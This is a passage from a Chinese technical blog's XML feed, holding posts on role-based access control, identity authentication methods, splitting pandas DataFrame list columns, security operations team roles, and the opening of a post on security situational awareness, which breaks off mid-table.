class="headerlink" title="3）基于角色的访问控制技术（Role-Based Access Control）"></a>3）基于角色的访问控制技术（Role-Based Access Control）</h4><p>基于角色的访问控制（RBAC）是实施面向企业安全策略的一种有效的访问控制方式。其基本思想是：对系统操作的各种权限不是直接授予具体的用户，而是在用户集合与权限集合之间建立一个角色集合。每一种角色对应一组相应的权限。一旦用户被分配了适当的角色后，该用户就拥有此角色的所有操作权限。这样做的好处是，不必在每次创建用户时都进行分配权限的操作，只要分配用户相应的角色即可，而且角色的权限变更比用户的权限变更要少得多，这样将简化用户的权限管理，减少系统的开销。<br>在一个组织内部，角色是相对稳定的，而用户和权限之间的关系则是易变的，比如因用户职务变化而随之发生权限变化。通过角色，可以减少授权管理的复杂度，降低管理开销，它是传统访问控制技术的有效补充。通常角色和用户组在概念上容易混淆，它们之间有本质的区别，组是用户的集合，而角色作为中介，既是用户的集合，又是权限的集合。<br>在一个组织内，安全管理员可以根据完成某项工作所需的权限，创建适当的角色；然后根据用户所要完成的任务，授予不同的角色，从而授予访问权限。用户与角色，角色与权限之间关系都是多对多的关系。用户与特定的一个或多个角色相联系，角色与一个或多个访问权限相联系。用户根据自己的需求动态地激活自己拥有的角色，完成特定的任务，避免误操作造成的危害。</p><p>授权和访问控制技术是安全防御的重要组成部分，可以有效防止未经授权的用户访问系统资源，保护系统的安全。在实际应用中，需要根据具体的安全需求和场景，选择合适的授权和访问控制技术，以达到最佳的安全防护效果。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之身份鉴别技术</title>
      <link href="/posts/84445f0e/"/>
      <url>/posts/84445f0e/</url>
      
        <content type="html"><![CDATA[<p>身份认证技术用于在计算机网络中确认操作者的身份。在计算机网络世界中，用户的身份信息是用一组特定的数据来表示的，计算机也只能识别用户的数字身份。身份认证技术能够作为系统安全的第一道防线，主要用于确认网络用户的身份，防止非法访问和恶意攻击，确保数字身份的操作者就是这个数字身份合法拥有者。</p><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1、身份鉴别"><a href="#1、身份鉴别" class="headerlink" title="1、身份鉴别"></a>1、身份鉴别</h3><p>身份鉴别是指对主客体身份进行确认的过程，也就是对网络用户在进入系统或访问受限系统资源时的身份进行识别和验证的过程。这是信息安全的第一道防线，可以确保用户身份的真实、合法和唯一性，防止非法人员进入系统。</p><p>身份鉴别的方法：主要有三种，即<strong>基于实体所知</strong>、<strong>基于实体所</strong>有和<strong>基于实体特性</strong>。<br>基于实体所知的方法包括密码、验证码等，这些方法的成本低，实现简单，但面临的风险也较大，如暴力破解、木马等。<br>基于实体所有的方法通常涉及一些物理设备，如IC卡、门禁卡等，安全性较高，但成本也较高，并可能面临损坏和被复制的风险。基于实体特性的方法通常采用生物识别技术进行验证，如指纹、虹膜、声波等，这是安全性最高的一种方式。</p><h3 id="2、标识"><a href="#2、标识" class="headerlink" title="2、标识"></a>2、标识</h3><p>标识认证技术是信息安全理论与技术的一个重要方面，是实现信息安全等级保护身份鉴别、访问控制的技术基础，主要包括信息认证与身份标识认证两个方面的内容。信息认证用于保护信息的完整性与抗否认性，身份标识认证则用于鉴别用户身份，限制非法用户访问资源。</p><h4 id="1）人的标识"><a href="#1）人的标识" class="headerlink" title="1）人的标识"></a>1）人的标识</h4><p>身份标识认证是安全技术的一个重要方面，在用户访问文件时，必须通过某种形式的身份标识验证机制来证明他们的身份，验证用户的身份与所宣称的保持一致，才能够实现对文件的访问。用户首先经过身份标识认证才能访问安全系统，然后由安全系统根据用户身份决定用户的访问权限。</p><h4 id="2）网络标识"><a href="#2）网络标识" class="headerlink" title="2）网络标识"></a>2）网络标识</h4><p>网络标识是指机器在网络中的标志信息，对一台具体的机器而言，机器的IP地址，MAC地址就是在网络中标识的。<br>在网络中，同一数据在不同的层有不同的标识，数据链路层的标识是MAC地址，网络层的标识是IP地址，传输层的标识就是UDP或者TCP的端口号。<br>主机的标识就是主机名称。在网络中，主机的名称+地址成为唯一的标识。</p><h4 id="3）应用标识"><a href="#3）应用标识" class="headerlink" title="3）应用标识"></a>3）应用标识</h4><p>应用标识包括应用名，进程名称，占用端口，序列号，标准的应答方式等。</p><h3 id="3、口令"><a href="#3、口令" class="headerlink" title="3、口令"></a>3、口令</h3><p>口令是指只有通信双方知晓的一段数据。口令是最广泛使用的一种身份鉴别方法，也是最容易实现和成本最低的用户鉴别和认证机制，但是经常会遭到攻击者的威胁：<br>口令字典攻击：也就是猜口令，在获得口令密文后，攻击者可以通过运用自己保存的口令字典，通过可以获得的相同的加密算法进行枚举尝试。<br>口令丢失：用户经常会将自己的口令分享给同事、上司或第三方工程人员。这样就失去了口令的鉴别作用。<br>口令嗅探：很多系统的口令在网络上都是明文传输的，比如，电子邮件，Telnet远程登录等。通过在网络关键路径上进行嗅探可以轻易地获得用户的口令。<br>口令文件被窃取：对口令文件的保护是口令机制的弱点。如果口令文件被窃取，可能导致大量的用户口令沦陷。</p><h3 id="4、挑战-响应技术"><a href="#4、挑战-响应技术" class="headerlink" title="4、挑战-响应技术"></a>4、挑战-响应技术</h3><p>挑战-响应技术是一种常用的基于口令的身份认证技术。<br>基于挑战/响应方式的身份认证系统就是每次认证时，认证服务器端都给客户端发送一个不同的“挑战”字串，客户端程序收到这个“挑战”字串后，做出相应的“响应”，基于此机制系统认证过程为：</p><ol><li>客户端向认证服务器发出请求，要求进行身份认证；</li><li>认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步处理；</li><li>如果是合法用户，认证服务器内部产生一个随机数，作为“提问”，发送给客户端；</li><li>客户端将用户名字和随机数合并，使用单向Hash函数（例如MD5算法）生成一个应答串作为响应；</li><li>认证服务器将应答串与自己的计算结果比较，若二者相同，则通过一次认证；否则，认证失败；</li><li>认证服务器通知客户端认证成功或失败。</li><li>认证成功之后，以后的认证由客户端不定时地发起，过程中没有了客户端认证请求一步。两次认证的时间间隔不能太短，否则会给网络、客户和认证服务器带来太大的开销；也不能太长，否则不能保证用户不被他人盗用IP地址，建议时长为1-2分钟。</li></ol><h3 id="5、公钥认证技术"><a href="#5、公钥认证技术" class="headerlink" title="5、公钥认证技术"></a>5、公钥认证技术</h3><p>公钥认证技术使用一对加密字符串，一个称为公钥，任何人都可以看到其内容；另一个称为私钥，由用户妥善保存。公钥认证技术功能的实现在于通过公钥加密过的密文使用私钥可以轻松解密，但根据私钥来猜测密钥却十分困难。</p><h2 id="二、常见的身份鉴别技术"><a href="#二、常见的身份鉴别技术" class="headerlink" title="二、常见的身份鉴别技术"></a>二、常见的身份鉴别技术</h2><ul><li>用户名/密码认证：这是一种最基本的方式，用户需要输入用户名和密码来证明自己的身份。但是，由于密码可能被破解或泄露，因此这种方式存在一定的安全隐患。</li><li>动态口令认证：这是一种更加安全的方式，用户需要输入动态生成的口令才能进入系统。这种方式可以有效地防止密码被破解或被盗用。</li><li>多因素认证：这是一种基于多种因素的认证方式，除了用户名和密码外，还需要用户提供其他信息，如手机验证码、指纹、虹膜等。这种方式可以大大提高系统的安全性。</li><li>基于角色的访问控制：这是一种基于用户角色的访问控制方式，用户只能访问自己被授权的资源。这种方式可以有效地防止未授权的访问和数据泄露。</li><li>单点登录认证：这种方式可以实现一次登录即可访问多个系统的功能，减少了用户的操作步骤，提高了工作效率。同时，这种方式也可以减少因某个系统被攻击而导致其他系统受到攻击的风险。</li></ul><p>身份鉴别技术是保护信息安全的重要手段，不同的应用场景需要选择合适的身份鉴别技术来保证系统的安全性和稳定性。</p><h2 id="三、防御措施"><a href="#三、防御措施" class="headerlink" title="三、防御措施"></a>三、防御措施</h2><p>针对身份鉴别过程中可能出现的攻击，如线路窃听和重放攻击等，需要采取相应的防御措施。例如，在口令中使用随机数可以防止攻击者通过构造特定表格（如彩虹表）来破解口令。针对重放攻击，可以在会话中引入时间戳或使用一次性口令等方式进行防御。</p><p>身份鉴别技术是网络安全的重要组成部分，通过确认网络用户的身份，可以有效地防止非法访问和恶意攻击。同时，随着技术的发展，身份鉴别技术也在不断地进步和完善，以应对日益复杂的网络安全威胁。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas将dataframe列中的list转换为多列</title>
      <link href="/posts/d97c8b95/"/>
      <url>/posts/d97c8b95/</url>
      
        <content type="html"><![CDATA[<p>在应用机器学习的过程中，很大一部分工作都是在做数据的处理，一个非常常见的场景就是将一个list序列的特征数据拆成多个单独的特征数据。</p><p>比如数据集如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [[<span class="string">'John'</span>, <span class="string">'25'</span>, <span class="string">'Male'</span>,[<span class="number">99</span>,<span class="number">100</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Emily'</span>, <span class="string">'22'</span>, <span class="string">'Female'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">98</span>]],</span><br><span class="line">        [<span class="string">'Michael'</span>, <span class="string">'30'</span>, <span class="string">'Male'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">100</span>]]]</span><br><span class="line">df_data= pd.DataFrame(data,columns=[<span class="string">'Name'</span>, <span class="string">'Age'</span>, <span class="string">'Gender'</span>,<span class="string">'Score'</span>])</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/1_%E4%B8%80%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="在这里插入图片描述"></p><p>很多场景是需要将类似于Score的list序列特征，拆成多个特征值如这里的语、数、外的分数。</p><p>下面通过几个实例来将dataframe列中的list序列转换为多列。</p><h3 id="1、一维序列拆成多列"><a href="#1、一维序列拆成多列" class="headerlink" title="1、一维序列拆成多列"></a>1、一维序列拆成多列</h3><p>可以通过在列上应用Series来进行拆分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_score=df_data[<span class="string">'Score'</span>].apply(pd.Series).rename(columns=&#123;<span class="number">0</span>:<span class="string">'English'</span>,<span class="number">1</span>:<span class="string">'Math'</span>,<span class="number">2</span>:<span class="string">'Chinese'</span>&#125;)</span><br><span class="line">df_score</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/2_%E4%B8%80%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86Series%E6%8B%86%E5%88%86.png" alt="在这里插入图片描述"></p><p>可以看到将Score的数组，拆分成了English、Math、Chinese三个特征字段了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_data=df_data.join(df_score)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/3_%E4%B8%80%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86join.png" alt="在这里插入图片描述"></p><h3 id="2、二维序列拆成多列"><a href="#2、二维序列拆成多列" class="headerlink" title="2、二维序列拆成多列"></a>2、二维序列拆成多列</h3><p>用同样的思路也可以将二维序列的特征列拆成多列<br>如特征列是二维序列，序列里还有多个序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [[<span class="string">'John'</span>, <span class="string">'25'</span>, <span class="string">'Male'</span>,[[<span class="number">99</span>,<span class="number">100</span>,<span class="number">98</span>],[<span class="number">89</span>,<span class="number">70</span>]]],</span><br><span class="line">        [<span class="string">'Emily'</span>, <span class="string">'22'</span>, <span class="string">'Female'</span>,[[<span class="number">97</span>,<span class="number">99</span>,<span class="number">98</span>],[<span class="number">99</span>,<span class="number">96</span>]]],</span><br><span class="line">        [<span class="string">'Michael'</span>, <span class="string">'30'</span>, <span class="string">'Male'</span>,[[<span class="number">97</span>,<span class="number">99</span>,<span class="number">100</span>],[<span class="number">87</span>,<span class="number">99</span>]]]]</span><br><span class="line">df_data= pd.DataFrame(data,columns=[<span class="string">'Name'</span>, <span class="string">'Age'</span>, <span class="string">'Gender'</span>,<span class="string">'Score'</span>])</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/4_%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%97%E8%A1%A8%E9%87%8C%E6%9C%89%E5%A4%9A%E4%B8%AA%E5%88%97%E8%A1%A8.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">df_score=df_data[<span class="string">'Score'</span>].apply(pd.Series)</span><br><span class="line">df_score_1=df_score[<span class="number">0</span>].apply(pd.Series).rename(columns=&#123;<span class="number">0</span>:<span class="string">'English'</span>,<span class="number">1</span>:<span class="string">'Math'</span>,<span class="number">2</span>:<span class="string">'Chinese'</span>&#125;)</span><br><span class="line">df_score_2=df_score[<span class="number">1</span>].apply(pd.Series).rename(columns=&#123;<span class="number">0</span>:<span class="string">'Biology'</span>,<span class="number">1</span>:<span class="string">'Geography'</span>&#125;)</span><br><span class="line">df_score=df_score_1.join(df_score_2)</span><br><span class="line">df_data=df_data.join(df_score_1).join(df_score_2)</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/5_%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%97%E8%A1%A8%E9%87%8C%E6%9C%89%E5%A4%9A%E4%B8%AA%E5%88%97%E8%A1%A8%E5%A4%9A%E6%AC%A1Series%E6%8B%86%E5%88%86.png" alt="在这里插入图片描述"></p><p>另外一种情况就是序列里面只有一个序列的二维序列，数据如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [[<span class="string">'John'</span>, <span class="string">'25'</span>, <span class="string">'Male'</span>,[[<span class="number">99</span>,<span class="number">100</span>,<span class="number">98</span>,<span class="number">89</span>,<span class="number">70</span>]]],</span><br><span class="line">        [<span class="string">'Emily'</span>, <span class="string">'22'</span>, <span class="string">'Female'</span>,[[<span class="number">97</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">99</span>,<span class="number">96</span>]]],</span><br><span class="line">        [<span class="string">'Michael'</span>, <span class="string">'30'</span>, <span class="string">'Male'</span>,[[<span class="number">97</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">87</span>,<span class="number">99</span>]]]]</span><br><span class="line">df_data= pd.DataFrame(data,columns=[<span class="string">'Name'</span>, <span class="string">'Age'</span>, <span class="string">'Gender'</span>,<span class="string">'Score'</span>])</span><br><span class="line">df_data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/6_%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%97%E8%A1%A8%E9%87%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%97%E8%A1%A8.png" alt="在这里插入图片描述"></p><p>这样也可以通过多次应用Series来进行拆分，也可以先explode()再应用Series来进行拆分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_score=df_data[<span class="string">'Score'</span>].apply(pd.Series)[<span class="number">0</span>].apply(pd.Series).rename(columns=&#123;<span class="number">0</span>:<span class="string">'English'</span>,<span class="number">1</span>:<span class="string">'Math'</span>,<span class="number">2</span>:<span class="string">'Chinese'</span>,<span class="number">3</span>:<span class="string">'Biology'</span>,<span class="number">4</span>:<span class="string">'Geography'</span>&#125;)</span><br><span class="line">df_score</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/7_%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%97%E8%A1%A8%E9%87%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%97%E8%A1%A8%E5%A4%9A%E6%AC%A1Series%E6%8B%86%E5%88%86.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_score=df_data[<span class="string">'Score'</span>].explode().apply(pd.Series).rename(columns=&#123;<span class="number">0</span>:<span class="string">'English'</span>,<span class="number">1</span>:<span class="string">'Math'</span>,<span class="number">2</span>:<span class="string">'Chinese'</span>,<span class="number">3</span>:<span class="string">'Biology'</span>,<span class="number">4</span>:<span class="string">'Geography'</span>&#125;)</span><br><span class="line">df_score</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231226/8_%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%97%E8%A1%A8%E9%87%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%97%E8%A1%A8%E5%85%88explode%E5%86%8DSeries%E6%8B%86%E5%88%86.png" alt="在这里插入图片描述"></p><p>两者效果是一样的。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之团队人员组织建议</title>
      <link href="/posts/68430272/"/>
      <url>/posts/68430272/</url>
      
        <content type="html"><![CDATA[<p>安全运营是一个持续的过程，需要不断地评估风险、监测威胁、改进措施和更新策略，以确保组织的安全性和可靠性。由人员、数据、平台（工具）、流程的共同组合构成安全运营体系。</p><h2 id="一、安全运营团队目标"><a href="#一、安全运营团队目标" class="headerlink" title="一、安全运营团队目标"></a>一、安全运营团队目标</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231222/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E5%9B%A2%E9%98%9F%E7%9B%AE%E6%A0%87.png" alt="安全运营团队目标"></p><center>图-安全运营团队目标</center><p>安全运营团队是具有日常安全运营及实战化攻防对抗能力的专职安全团队，依托安全运营中心平台，有效使用各项安全工具，以标准化的作业流程驱动，开展各项安全运营活动，实现安全工作持续、主动、精细化、标准化的过程管理，通过持续有效的安全运营活动满足合规要求、降低网络安全风险、保障企业网络安全。</p><h2 id="二、团队人员组织架构"><a href="#二、团队人员组织架构" class="headerlink" title="二、团队人员组织架构"></a>二、团队人员组织架构</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231222/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E5%9B%A2%E9%98%9F%E4%BA%BA%E5%91%98%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84.png" alt="在这里插入图片描述"></p><center>图-安全运营团队人员组织架构</center><h2 id="三、运营团队职责分工"><a href="#三、运营团队职责分工" class="headerlink" title="三、运营团队职责分工"></a>三、运营团队职责分工</h2><table border="1" cellspacing="0">    <thead  style="background-color: lightgray;" >        <td>序号</td>         <td>运营工作内容</td>         <td>运营工作子项</td>        <td>频率</td>        <td>所属分组</td>        <td>相关职责</td>        <td>备注</td>    </thead>    <tr>        <td rowspan="2">1</td>         <td rowspan="2">安全资产识别与梳理</td>         <td>安全资产发现和识别</td>        <td rowspan="3">按需</td>        <td rowspan="3">安全资产管理</td>        <td rowspan="2">对已有安全资产和新增安全资产进行管理维护，协调督促业务部门安全资产责任人进行资产数据上报、agent安装。定期对异常资产、未纳管安全资产等进行通报督促整改。</td>        <td rowspan="3">常态化</td>    </tr>    <tr>         <td>安全资产信息梳理与管理</td>    </tr>    <tr>         <td >2</td>         <td>安全资产脆弱性管理</td>        <td>安全资产脆弱性识别与管理</td>        <td>对安全资产的脆弱性进行定期的识别，发布存在有脆弱性风险通知到安全资产责任人，督促整改，对脆弱性问题跟踪确认。</td>    </tr>    <tr>         <td rowspan="6">3</td>         <td rowspan="6">威胁监测</td>        <td >威胁监测</td>        <td rowspan="8">按需</td>        <td rowspan="8">监测研判</td>        <td rowspan="8">            1.对安全监测平台进行日常的监测运营工作，形成相关交付物。（运营日报、周报、月报等）<br>            2.对监测过程中发现的安全告警进行初步筛选，排查是否误报，对非误报告警进行安全级别判断，对判断后的安全告警进行安全事件的升级，并进行专人的研判分析。<br>            3.对分析后重要安全事件，进行处置组递交沟通，提供事件分析报告。并对处置执行组反馈的处置情况进行复验审核工作。        </td>        <td rowspan="8">常态化</td>    </tr>    <tr>         <td >威胁分析与通告</td>     </tr>    <tr>         <td >持续攻击对抗</td>     </tr>    <tr>         <td >事件分析与处置</td>     </tr>    <tr>         <td >应急响应</td>     </tr>    <tr>         <td >安全运营可视化</td>     </tr>    <tr>        <td rowspan="2">4</td>         <td rowspan="2">人工研判</td>         <td >安全事件人工研判</td>     </tr>    <tr>         <td >定期安全运营汇报</td>     </tr>    <tr>         <td rowspan="3">5</td>         <td rowspan="3">安全问题处置</td>         <td >安全事件处置</td>         <td rowspan="5">按需</td>         <td rowspan="5">处置执行</td>        <td rowspan="5">            1.对研判后的安全事件进行处置操作，负责协调相关业务部门及安全资产归属单位，对网络及安全策略进行调整优化控制（含平台策略优化）。<br>            2.对责任部门或责任人按处置流程进行通告下发，并跟踪事件处置过程，提供处置建议与咨询。<br>            3. 跟踪事件处置情况，并将处置反馈情况同步监测研判组进行复验，负责对安全事件处置进行闭环，归档工作。<br>        </td>        <td rowspan="5">常态化</td>    </tr>    <tr>         <td >安全事件归档</td>     </tr>    <tr>         <td >安全事件报告</td>     </tr>    <tr>         <td >6</td>         <td >安全通告</td>         <td >安全事件通告</td>     </tr>    <tr>         <td >7</td>         <td >策略管理</td>         <td >策略管理</td>     </tr>    <tr>         <td rowspan="5">8</td>         <td rowspan="5">平台保障</td>         <td >现场处置协调跟踪</td>         <td rowspan="5">按需</td>         <td rowspan="5">平台保障</td>         <td rowspan="5">            1.对安全运营中心平台进行日常的巡检维护，对各平台功能，告警数据采集，设备权限，性能消耗进行巡检监控，对巡检过程中发现的问题及时跟踪处理。<br>            2.协助处置执行组对安全事件进行处置闭环跟踪及协调工作。<br>            3.根据运营需求进行平台规则优化、剧本流程优化。<br>        </td>         <td rowspan="5">            常态化（平台建设方参与）        </td>    </tr>    <tr>         <td >现场故障应急处理</td>     </tr>    <tr>         <td >平台现场运营监测</td>     </tr>    <tr>         <td >平台运营日常巡检</td>     </tr>    <tr>         <td >平台规则流程优化</td>     </tr>    <tr>         <td rowspan="2">9</td>         <td rowspan="2">脆弱性评估与管理</td>         <td >漏洞、弱口令扫描            最新漏洞预警和响应            </td>         <td rowspan="2">月/次</td>         <td rowspan="7">安全服务</td>         <td rowspan="5">            1.负责漏洞管理、渗透测试、应急演练的方案整理及需求确认工作。<br>            2.依据各服务内容流程，负责实施相关服务。<br>            3.对服务过程发现安全问题进行协助处置工作，并提供处置方案。<br>            4.负责方案服务总结，并对发现安全问题进行分析总结，提供加固建议及安全事件处理能力的建议。<br>                    </td>         <td rowspan="7">            按需，一般以服务外包的方式外包给专业团队        </td>    </tr>    <tr>         <td >漏洞协助处置</td>     </tr>    <tr>         <td rowspan="2">10</td>        <td rowspan="2">渗透测试</td>         <td >渗透测试方案</td>         <td rowspan="2">按需</td>    </tr>    <tr>         <td >渗透测试内容</td>     </tr>    <tr>         <td >11</td>        <td >应急演练</td>         <td >应急演练</td>         <td >一年/次</td>    </tr>    <tr>         <td rowspan="2">12</td>        <td rowspan="2">风险评估</td>         <td >双新评估服务</td>         <td >一年/次</td>        <td rowspan="2">负责双新评估、定级备案风险评估等安全风险评估服务。</td>    </tr>    <tr>         <td >定级备案风险评估</td>         <td >一年/次</td>    </tr>    <tr>         <td >13</td>         <td >流程优化</td>        <td >运营流程及人员调整优化</td>        <td rowspan="3">按需</td>        <td rowspan="3">安全运营管理</td>        <td rowspan="3">            流程优化；团队管理；            培训组织；工作汇报；            质量审核；应急响应。        </td>        <td rowspan="3">            常态化，固定负责人        </td>    </tr>    <tr>        <td >14</td>         <td >工作汇报</td>        <td >安全监测运营汇报（月报、季报、半年报）</td>    </tr>    <tr>        <td >15</td>         <td >培训组织</td>        <td >培训组织</td>    </tr></table><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231222/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E5%9B%A2%E9%98%9F%E8%81%8C%E8%B4%A3.png" alt="在这里插入图片描述"></h2><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之态势感知与监测</title>
      <link href="/posts/e89ce9ea/"/>
      <url>/posts/e89ce9ea/</url>
      
        <content type="html"><![CDATA[<p>信息安全是一个动态的过程，操作系统、应用软件、中间件，还有硬件，平台的种类越来越多，技术越来越复杂，稍有不慎就会留下安全隐患和管理漏洞，依靠客户自身的IT资源无论从技术的先进性还是方案的严密性上都越来越难以应对，企业往往由于人手或技术力量的不足，无法自如的处理各种复杂的信息安全问题。针对这种情况，就需要持续对新的安全威胁、安全漏洞进行跟踪、分析和响应。</p><p>安全态势感知与监测是一种基于环境的、动态、整体地洞悉安全风险的能力，它以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</p><p>目前网络安全态势感知平台系统架构如下：</p><ol><li>海量多元异构数据的汇聚融合技术：在大规模网络中，网络安全数据和日志数据由海量设备和多个应用系统中产生，且这些安全数据和日志数据缺乏统一标准与关联，在此基础上进行数据分析，无法得到全局精准的分析结果。</li><li>数据挖掘与智能分析技术：通过机器学习、大数据分析等技术，实现基于逻辑和知识的推理结果，从已知威胁推演未知威胁，实现对安全威胁事件的预测和判断。</li><li>威胁情报的共享与交换技术：通过建立威胁情报共享与交换平台，实现不同安全厂商、不同组织之间的威胁情报共享与交换，提高安全态势感知的准确性和效率。</li></ol><p>一、安全监控</p><p>安全监控应覆盖网络、安全设备、主机、数据库、应用和中间件的安全和性能监控，具体内容如下：</p><table><thead><tr><th>类型</th><th>内容</th><th>监控方式</th></tr></thead><tbody><tr><td>网络层</td><td>路由器、防火墙、IPS、WAF等</td><td>SNMP、syslog等</td></tr><tr><td>主机层</td><td>Windows2000/XP/2003、Solaris、AIX、HP-UX、Redhat Linux</td><td>SNMP、syslog、专用数据收集代理</td></tr><tr><td>数据库</td><td>Oracle、MS SQL 